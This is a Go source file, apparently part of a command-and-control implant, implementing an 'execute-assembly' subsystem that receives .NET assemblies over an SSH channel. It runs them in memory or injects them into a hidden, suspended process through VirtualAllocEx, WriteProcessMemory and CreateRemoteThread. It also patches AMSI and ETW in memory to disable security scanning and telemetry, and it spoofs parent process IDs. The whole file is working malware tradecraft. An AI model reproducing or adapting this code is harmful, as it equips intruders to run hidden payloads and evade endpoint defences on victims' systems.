//go:build windows && executeassembly
// +build windows,executeassembly

package subsystems

import (
	executeassembly "agent/internal/sshd/subsystems/execute_assembly"
	"bytes"
	"crypto/sha256"
	"flag"
	"fmt"
	"io"
	"os/exec"
	"strings"
	"syscall"
	"time"

	// {{if .Debug}}
	"log"
	// {{end}}
	"unsafe"

	clr "github.com/Ne0nd0g/go-clr"
	"github.com/google/shlex"
	"golang.org/x/crypto/ssh"
	"golang.org/x/sys/windows"
)

func init() {
	Subsystems["execute-assembly"] = subsystemExecuteAssembly
}

var (
	runtimeHost  *clr.ICORRuntimeHost
	assemblies   = make(map[[32]byte]*clr.MethodInfo)
	currentToken windows.Token
)

func subsystemExecuteAssembly(channel ssh.Channel, args []string) {
	defer channel.Close()

	var (
		inProcess    bool
		runtime      string
		processName  string
		processArgs  string
		ppid         int
		assemblyArgs string
	)

	// Parse flags
	flags := &flag.FlagSet{}
	flags.SetOutput(channel)

	// In-process flags
	flags.BoolVar(&inProcess, "in-process", false, "Execute assembly in current process")
	flags.StringVar(&runtime, "runtime", "v4", "CLR runtime to use (default: v4)")

	// Inject flags
	flags.StringVar(&processName, "process", "notepad.exe", "Process to inject assembly into")
	flags.StringVar(&processArgs, "process-args", "", "Arguments to pass to the process")
	flags.IntVar(&ppid, "ppid", 0, "Parent process ID to inject assembly into (default: 0)")

	// Shared flags
	flags.StringVar(&assemblyArgs, "args", "", "Assembly arguments")
	flags.Parse(args)

	// If no flags provided, print help
	if len(args) == 0 {
		flags.PrintDefaults()
		return
	}

	// Read assembly from STDIN
	blob, err := io.ReadAll(channel)
	if err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to read from STDIN. Error: %v\n", err)))
		return
	}
	if len(blob) < 16 {
		channel.Write([]byte("[ERR] No assembly provided\n"))
		return
	}

	// Execute assembly
	if inProcess {
		executeAssemblyInProcess(channel, runtime, blob, assemblyArgs)
	} else {
		executeAssembly(channel, processName, processArgs, ppid, blob, assemblyArgs)
	}
}

func executeAssemblyInProcess(channel ssh.Channel, runtime string, blob []byte, assemblyArgs string) {
	if runtimeHost == nil {
		if err := initRuntimeHost(runtime); err != nil {
			channel.Write([]byte(fmt.Sprintf("[ERR] Failed to load CLR. Error: %v\n", err)))
			return
		}
	}

	parsedArgs, err := shlex.Split(assemblyArgs)
	if err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to parse assembly arguments. Error: %v\n", err)))
		return
	}

	if len(parsedArgs) == 0 {
		channel.Write([]byte("[ERR] No assembly arguments provided\n"))
		return
	}

	var methodInfo *clr.MethodInfo
	hash := sha256.Sum256(blob)
	if v, ok := assemblies[hash]; ok {
		channel.Write([]byte("[INF] Using cached assembly\n"))
		methodInfo = v
	} else {
		channel.Write([]byte("[INF] Loading assembly\n"))
		methodInfo, err = clr.LoadAssembly(runtimeHost, blob)
		if err != nil {
			channel.Write([]byte(fmt.Sprintf("[ERR] Failed to load assembly. Error: %v\n", err)))
			return
		}
		assemblies[hash] = methodInfo
	}
	channel.Write([]byte("[INF] Executing assembly in current process\n"))

	stdOut, stdErr := clr.InvokeAssembly(methodInfo, parsedArgs)
	if stdOut != "" {
		channel.Write([]byte(fmt.Sprintf("[INF] STDOUT: \n%s\n", stdOut)))
	}
	if stdErr != "" {
		channel.Write([]byte(fmt.Sprintf("[INF] STDERR: \n%s\n", stdErr)))
	}
}

func executeAssembly(channel ssh.Channel, processName string, processArgs string, ppid int, blob []byte, assemblyArgs string) {
	parsedProcessArgs, err := shlex.Split(processArgs)
	if err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to parse process arguments. Error: %v\n", err)))
		return
	}

	// Start suspended process
	channel.Write([]byte("[INF] Starting process\n"))
	var cmd *exec.Cmd
	if len(parsedProcessArgs) > 0 {
		cmd = exec.Command(processName, parsedProcessArgs...)
	} else {
		cmd = exec.Command(processName)
	}
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:         syscall.Token(currentToken),
		HideWindow:    true,
		CreationFlags: windows.CREATE_SUSPENDED,
	}

	// Try to spoof parent
	err = spoofParent(cmd, ppid)
	if err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to spoof parent. Error: %v\n", err)))
	}

	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	// Start process
	if err := cmd.Start(); err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to start process. Error: %v\n", err)))
		return
	}
	pid := cmd.Process.Pid
	channel.Write([]byte(fmt.Sprintf("[INF] Process '%s' started with PID: %d\n", cmd.Path, pid)))

	// Get handles
	handle, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, true, uint32(pid))
	if err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to get process handle. Error: %v\n", err)))
		return
	}
	defer windows.CloseHandle(handle)

	currentProcessHandle, err := windows.GetCurrentProcess()
	if err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to get current process handle. Error: %v\n", err)))
		return
	}
	defer windows.CloseHandle(currentProcessHandle)

	var lpTargetHandle windows.Handle
	err = windows.DuplicateHandle(handle, currentProcessHandle, currentProcessHandle, &lpTargetHandle, 0, false, windows.DUPLICATE_SAME_ACCESS)
	if err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to duplicate handle. Error: %v\n", err)))
		return
	}
	defer windows.CloseHandle(lpTargetHandle)

	// Inject assembly
	threadHandle, err := injectAssembly(lpTargetHandle, blob)
	if err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to inject assembly. Error: %v\n", err)))
		return
	}
	defer windows.CloseHandle(threadHandle)

	// Wait for process
	for {
		var code uint32
		err := executeassembly.GetExitCodeThread(threadHandle, &code)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			channel.Write([]byte(fmt.Sprintf("[ERR] Failed to get exit code. Error: %v\n", err)))
			return
		}
		channel.Write([]byte(fmt.Sprintf("[INF] Process exited with code: %d, error: %v\n", code, err)))

		if code == 259 { // STILL_ACTIVE
			time.Sleep(time.Second)
		} else {
			break
		}
	}

	if err := cmd.Process.Kill(); err != nil {
		channel.Write([]byte(fmt.Sprintf("[ERR] Failed to kill process. Error: %v\n", err)))
	}

	// Read output
	stdout := stdoutBuf.String()
	stderr := stderrBuf.String()
	if stdout != "" {
		channel.Write([]byte(fmt.Sprintf("[INF] STDOUT: \n%s\n", stdout)))
	}
	if stderr != "" {
		channel.Write([]byte(fmt.Sprintf("[INF] STDERR: \n%s\n", stderr)))
	}
}

func patchAmsi() error {
	// load amsi.dll
	amsiDLL := windows.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
	amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
	amsiScanString := amsiDLL.NewProc("AmsiScanString")

	// patch
	amsiAddr := []uintptr{
		amsiScanBuffer.Addr(),
		amsiInitialize.Addr(),
		amsiScanString.Addr(),
	}
	patch := byte(0xC3)
	for _, addr := range amsiAddr {
		// skip if already patched
		if *(*byte)(unsafe.Pointer(addr)) != patch {
			// {{if .Debug}}
			log.Println("Patching AMSI")
			// {{end}}
			var oldProtect uint32
			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
			if err != nil {
				//{{if .Debug}}
				log.Println("VirtualProtect failed:", err)
				//{{end}}
				return err
			}
			*(*byte)(unsafe.Pointer(addr)) = 0xC3
			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
			if err != nil {
				//{{if .Debug}}
				log.Println("VirtualProtect (restauring) failed:", err)
				//{{end}}
				return err
			}
		}
	}
	return nil
}

func patchEtw() error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")

	// patch
	patch := byte(0xC3)
	// skip if already patched
	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
		// {{if .Debug}}
		log.Println("Patching ETW")
		// {{end}}
		var oldProtect uint32
		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
		if err != nil {
			//{{if .Debug}}
			log.Println("VirtualProtect failed:", err)
			//{{end}}
			return err
		}
		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
		if err != nil {
			//{{if .Debug}}
			log.Println("VirtualProtect (restauring) failed:", err)
			//{{end}}
			return err
		}
	}
	return nil
}

func initRuntimeHost(runtime string) error {
	err := patchAmsi()
	if err != nil {
		return err
	}

	err = patchEtw()
	if err != nil {
		return err
	}

	runtimeHost, err = clr.LoadCLR(runtime)
	if err != nil {
		return err
	}
	err = clr.RedirectStdoutStderr()
	if err != nil {
		return err
	}
	return nil
}

func spoofParent(cmd *exec.Cmd, ppid int) error {
	parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS|windows.PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION, false, uint32(ppid))
	if err != nil {
		return err
	}
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &windows.SysProcAttr{}
	}
	cmd.SysProcAttr.ParentProcess = syscall.Handle(parentHandle)
	return nil
}

func injectAssembly(processHandle windows.Handle, blob []byte) (windows.Handle, error) {
	var threadHandle windows.Handle

	// Allocate memory in process
	remoteAddr, err := executeassembly.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(len(blob))), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return threadHandle, fmt.Errorf("failed to allocate memory in process: %w", err)
	}

	// Write assembly to process
	var nLength uintptr
	err = executeassembly.WriteProcessMemory(processHandle, remoteAddr, &blob[0], uintptr(uint32(len(blob))), &nLength)
	if err != nil {
		return threadHandle, fmt.Errorf("failed to write process memory: %w", err)
	}

	// Change memory protection
	var oldProtect uint32
	err = executeassembly.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(len(blob))), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return threadHandle, fmt.Errorf("failed to change memory protection: %w", err)
	}

	// Create remote thread
	var lpThreadId uint32
	var attr = new(windows.SecurityAttributes)
	threadHandle, err = executeassembly.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
	if err != nil {
		return threadHandle, fmt.Errorf("failed to create remote thread: %w", err)
	}

	return threadHandle, nil
}
